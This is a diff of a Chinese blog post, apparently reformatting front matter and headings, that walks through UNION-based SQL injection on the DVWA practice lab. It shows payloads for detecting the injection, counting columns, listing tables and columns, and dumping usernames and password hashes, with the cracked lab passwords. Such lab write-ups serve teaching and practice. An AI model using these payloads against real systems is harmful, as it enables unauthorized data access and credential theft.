@@ -1,14 +1,23 @@
-+++
-date = "2019-08-13T10:37:42+08:00"
-categories = ["靶场"]
-tags = ["DVWA","SQL注入"]
-
-
-title = "SQL注入（Union注入）"
-description = "GET - 有报错 - 单引号 - 字符型注入"
-images = []
-
-+++
+---
+title: "SQL注入（Union注入）"
+date: 2019-08-13T10:37:42+08:00
+description: "GET - 有报错 - 单引号 - 字符型注入"
+draft: false
+hideToc: false
+enableToc: true
+enableTocContent: false
+tocPosition: inner
+tocLevels: ["h2", "h3", "h4"]
+tags:
+- "OWASP-TOP 10"
+- "DVWA靶场"
+- "SQL注入"
+categories:
+- "渗透测试"
+series:
+- "技术研究"
+image: 
+---
 
 - 漏洞类型：SQL注入/Get 字符型
 
@@ -22,22 +31,22 @@ images = []
 
 ---
 
-# 判断注入类型
+## 判断注入类型
 
-#### 正常输入数字查询信息，下图为为输入3时，显示的信息。
+### 正常输入数字查询信息，下图为为输入3时，显示的信息。
 
 ![user id=3](https://ae01.alicdn.com/kf/Ua09c3083509142c0bd8eb5051a18ee5el.png)
 
-#### 数字后面，加上单引号测试
+### 数字后面，加上单引号测试
 
 > http://www.dvwa.com/vulnerabilities/sqli/?id=1'&Submit=Submit#
 
-#### 得到报错，不过还不能确定是字符型，还是数字型注入。
+### 得到报错，不过还不能确定是字符型，还是数字型注入。
 
 
 > You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
 
-#### 去掉 id=1 后的 “单引号” 继续用布尔值测试
+### 去掉 id=1 后的 “单引号” 继续用布尔值测试
 
 布尔值
 
@@ -55,7 +64,7 @@ images = []
 
 所以，基本确定，这是一个**字符型注入**，注入的语句，要采用闭合单引号方法，使之带入后端查询。
 
-# 判断当前页面，读取表的字段数量
+## 判断当前页面，读取表的字段数量
 
 
 > ①：'+order by 3--+
@@ -63,15 +72,15 @@ images = []
 > ②：'+order by 4--+
 
 
-#### order by 2：页面正常
+### order by 2：页面正常
 
 ![页面正常](https://images.weserv.nl/?url=https://img03.sogoucdn.com/app/a/100520146/8c97c2f5ef0dae6d74601e6629eeb1a1)
 
-#### order by 3：页面异常，报错
+### order by 3：页面异常，报错
 
 ![order by判断字段数](https://images.weserv.nl/?url=https://img02.sogoucdn.com/app/a/100520146/c26b54c4a6b4ec505140b13414829594)
 
-# 确认信息在当前页面，显示的位置
+## 确认信息在当前页面，显示的位置
 
 
 > '+union select 1,2--+
@@ -84,7 +93,7 @@ images = []
 ![查询数据库名、版本信息](https://ae01.alicdn.com/kf/U04cd6a2fa8c147fa9b8c5985bc618e76a.png)
 
 
-# 读取当前页面，使用的数据库、表
+## 读取当前页面，使用的数据库、表
 
 
 > '+union+select table_schema,table_name
@@ -94,7 +103,7 @@ images = []
 
 ![库名、表名](https://ae01.alicdn.com/kf/U4165d5261666491fa520a4cfddadd0229.png)
 
-# 读取users表的所有字段
+## 读取users表的所有字段
 
 
 > '+union select table_name,column_name 
@@ -107,7 +116,7 @@ where table_schema=database() and table_name='users'--+
 
 接下来就要从users表中，读取这两个字段得内容了。
 
-# 读取用户名和密码
+## 读取用户名和密码
 
 
 > ' union select user,password from dvwa.users--+
@@ -117,7 +126,7 @@ where table_schema=database() and table_name='users'--+
 
 密码被加密保存，目测（滑稽）md5加密
 
-# 解密md5，得到登陆密码
+## 解密md5，得到登陆密码
 > admin：5f4dcc3b5aa765d61d8327deb882cf99（password）
 > 
 > gordonb：e99a18c428cb38d5f260853678922e03（abc123）
@@ -130,7 +139,7 @@ where table_schema=database() and table_name='users'--+
 
 
 
-# 总结
+## 总结
 
 - 先看传输参数，是用的HTTP协议中的，那种传输方式
 - 再判断是字符型还是数字型的注入，选择闭合或者其他方法，保证语句生效
